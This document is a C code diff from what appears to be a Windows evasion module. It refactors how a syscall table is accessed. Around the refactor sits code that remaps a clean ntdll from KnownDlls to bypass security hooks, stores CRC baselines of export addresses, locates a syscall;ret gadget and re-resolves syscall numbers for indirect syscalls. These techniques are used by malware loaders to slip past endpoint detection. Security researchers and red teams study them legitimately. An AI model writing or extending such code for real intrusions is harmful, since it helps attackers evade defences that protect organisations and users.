@@ -17,8 +17,7 @@
 /* Current-process pseudo-handle */
 #define NtCurrentProcess() ((HANDLE)(ULONG_PTR)-1)
 
-/* External globals */
-extern SYSCALL_TABLE g_syscall_table;
+/* No extern globals — syscall table accessed via EVASION_CONTEXT */
 
 /* ------------------------------------------------------------------ */
 /*  CRC32 implementation (IEEE 802.3 polynomial, no lookup table)       */
@@ -72,11 +71,11 @@ NTSTATUS evasion_init_crc_table(EVASION_CONTEXT *ctx) {
 
     /* Iterate over all resolved syscall entries and compute CRC
        baselines from the clean ntdll mapping */
-    for (DWORD i = 0; i < g_syscall_table.count; i++) {
+    for (DWORD i = 0; i < ctx->syscall_table->count; i++) {
         if (ctx->crc_table.count >= CRC_TABLE_CAPACITY)
             break;
 
-        DWORD func_hash = g_syscall_table.entries[i].hash;
+        DWORD func_hash = ctx->syscall_table->entries[i].hash;
 
         /* Resolve function address in the clean ntdll */
         PVOID clean_addr = find_export_by_hash(ctx->clean_ntdll, func_hash);
@@ -114,7 +113,7 @@ NTSTATUS evasion_refresh_ntdll(EVASION_CONTEXT *ctx) {
     if (ctx->clean_ntdll) {
         spec_NtUnmapViewOfSection(NtCurrentProcess(), ctx->clean_ntdll);
         ctx->clean_ntdll = NULL;
-        g_syscall_table.clean_ntdll = NULL;
+        ctx->syscall_table->clean_ntdll = NULL;
     }
 
     /* Open \KnownDlls\ntdll.dll section */
@@ -148,24 +147,24 @@ NTSTATUS evasion_refresh_ntdll(EVASION_CONTEXT *ctx) {
 
     /* Update pointers */
     ctx->clean_ntdll = clean_base;
-    g_syscall_table.clean_ntdll = clean_base;
+    ctx->syscall_table->clean_ntdll = clean_base;
 
     /* Re-find syscall;ret gadget in fresh mapping */
     PVOID gadget = sc_find_gadget(clean_base);
     if (!gadget) {
         spec_NtUnmapViewOfSection(NtCurrentProcess(), clean_base);
         ctx->clean_ntdll = NULL;
-        g_syscall_table.clean_ntdll = NULL;
+        ctx->syscall_table->clean_ntdll = NULL;
         return STATUS_PROCEDURE_NOT_FOUND;
     }
 
     /* Re-resolve SSNs for all cached entries */
-    for (DWORD i = 0; i < g_syscall_table.count; i++) {
-        DWORD hash = g_syscall_table.entries[i].hash;
+    for (DWORD i = 0; i < ctx->syscall_table->count; i++) {
+        DWORD hash = ctx->syscall_table->entries[i].hash;
         DWORD ssn  = sc_resolve_ssn(clean_base, hash);
         if (ssn != (DWORD)-1) {
-            g_syscall_table.entries[i].ssn = ssn;
-            g_syscall_table.entries[i].syscall_addr = gadget;
+            ctx->syscall_table->entries[i].ssn = ssn;
+            ctx->syscall_table->entries[i].syscall_addr = gadget;
         }
     }
 
